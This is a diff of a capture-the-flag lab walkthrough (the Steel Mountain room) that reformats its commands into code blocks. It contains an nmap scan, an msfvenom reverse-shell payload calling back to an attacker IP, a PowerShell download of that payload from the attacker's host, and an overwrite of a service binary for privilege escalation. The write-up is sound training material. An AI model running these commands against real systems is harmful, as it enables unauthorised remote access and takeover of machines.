@@ -13,7 +13,6 @@ Run the following nmap command in order to scan the target machine.
 ```bash 
 sudo nmap -sS --top-ports 200 10.10.139.106
 ```
-Open the link to see the output of nmap: 
 ![Alt text](../Screenshots/Steel_Mountain/nmap_output.png)
 
 We can see that http-proxy is running on port 8080. So,
@@ -56,15 +55,20 @@ Now, I changed my directory to `c:\Users\bill\Desktop\` and read the content of 
 
 #### Privilege Escalation:
 Now, We need to upload a PowerUp.ps1 file to target machine. For that purpose, download it via the given link and then use the command below to transfer the file to target machine:
-`upload upload /path/to/PowerUp.ps1`
+```bash
+upload /path/to/PowerUp.ps1
+```
 This path is the path of the script in your attacker machine.
 ![Alt text](../Screenshots/Steel_Mountain/upload_powerup.png)
 
 Now, in meterpreter, hit the command:
-`shell`
+```
+shell
+```
 Then go to the path where Powerup.ps1 script is present and enter the followind command:
-`powershell -c ". .\PowerUp.ps1; Invoke-AllChecks"`
-
+```
+powershell -c ". .\PowerUp.ps1; Invoke-AllChecks"
+```
 Above command will shown up the service that can be exploited, a part of it is shown below:
 
 ![Alt text](../Screenshots/Steel_Mountain/script_output.png)
@@ -74,11 +78,13 @@ Now, I am going to replace the actual file with our maclicious file (payload), s
 #### Creating paylod
 
 using msfconsole, we can make our payload:
-`msfvenom -p windows/shell_reverse_tcp LHOST=10.8.25.176 LPORT=4443 -f exe -o Advanced.exe`
-
-now inside the shell of target machine, run the followind command to copy the payload from attacker's machine:
-`powershell -NoP -NonI -C "Invoke-WebRequest -Uri 'http://10.8.25.176:8000/Advanced.exe' -OutFile $env:USERPROFILE\\Desktop\\ASCService.exe"`
-
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.8.25.176 LPORT=4443 -f exe -o Advanced.exe
+```
+Now inside the shell of target machine, run the followind command to copy the payload from attacker's machine:
+```
+powershell -NoP -NonI -C "Invoke-WebRequest -Uri 'http://10.8.25.176:8000/Advanced.exe' -OutFile $env:USERPROFILE\\Desktop\\ASCService.exe"
+```
 Now I copied this payload to the desired path where legitimate exe file was present, I overwrite that with my payload:
 `copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare"`
 #### Error resolution: 
